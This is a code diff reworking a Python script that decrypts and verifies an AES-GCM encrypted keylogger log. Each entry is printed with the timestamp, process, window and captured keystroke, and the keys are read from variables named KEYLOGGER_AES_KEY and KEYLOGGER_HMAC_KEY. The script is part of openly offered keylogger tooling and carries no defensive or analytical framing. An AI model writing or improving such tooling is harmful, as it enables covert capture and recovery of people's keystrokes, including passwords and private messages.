@@ -1,43 +1,47 @@
-import base64
-import json
+# decrypt_keylog.py
 import os
+import json
+import base64
+import hmac
+import hashlib
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.primitives import hashes, hmac
 
-# 32-byte key must be the SAME as used during encryption
-KEY = b'\x00'*32  # TODO: put your actual key here
+KEY = os.environ.get("KEYLOGGER_AES_KEY")  # Must be 32 bytes
+HMAC_KEY = os.environ.get("KEYLOGGER_HMAC_KEY")  # Must be 32 bytes
+LOG_FILE = "keylog_encrypted.txt"
 
-log_file = "keylog_encrypted.txt"
+if not KEY or not HMAC_KEY:
+    raise EnvironmentError("Keys not set in environment variables.")
 
-def decrypt_and_verify(record_json: str) -> str:
-    """Decrypt and verify HMAC of a single encrypted record."""
-    record = json.loads(record_json)
-    nonce = base64.b64decode(record['nonce'])
-    ct = base64.b64decode(record['ct'])
-    hmac_tag = base64.b64decode(record['hmac'])
+KEY = base64.b64decode(KEY)
+HMAC_KEY = base64.b64decode(HMAC_KEY)
 
-    # First, verify HMAC
-    h = hmac.HMAC(KEY, hashes.SHA256()) 
-    h.update(nonce + ct) 
-    try:
-        h.verify(hmac_tag) 
-    except Exception:
-        return "[TAMPERED OR CORRUPTED]"
+def verify_hmac(encrypted: bytes, expected_hmac: bytes) -> bool:
+    computed_hmac = hmac.new(HMAC_KEY, encrypted, hashlib.sha256).digest()
+    return hmac.compare_digest(computed_hmac, expected_hmac)
 
-    # If HMAC checks, decrypt
+def decrypt_entry(nonce: bytes, encrypted: bytes) -> dict:
     aesgcm = AESGCM(KEY)
-    plaintext = aesgcm.decrypt(nonce, ct, None)
-    return plaintext.decode('utf-8')
+    return json.loads(aesgcm.decrypt(nonce, encrypted, None))
 
-def main():
-    if not os.path.exists(log_file):
-        print("Log file not found.")
-        return
-    
-    with open(log_file, "r", encoding="utf-8") as f:
+def read_and_decrypt_logs():
+    with open(LOG_FILE, "r") as f:
         for line in f:
-            message = decrypt_and_verify(line)
-            print(message)
+            try:
+                record = json.loads(line.strip())
+                nonce = base64.b64decode(record["nonce"])
+                data = base64.b64decode(record["data"])
+                hmac_sig = base64.b64decode(record["hmac"])
+
+                if not verify_hmac(data, hmac_sig):
+                    print("[!] Tampering detected in log entry.")
+                    continue
+
+                entry = decrypt_entry(nonce, data)
+                print(f"{entry['timestamp']} | {entry['process']} | {entry['window']} | {entry['key']}")
+
+            except Exception as e:
+                print(f"Error decrypting log: {e}")
 
 if __name__ == "__main__":
-    main()
+    read_and_decrypt_logs()
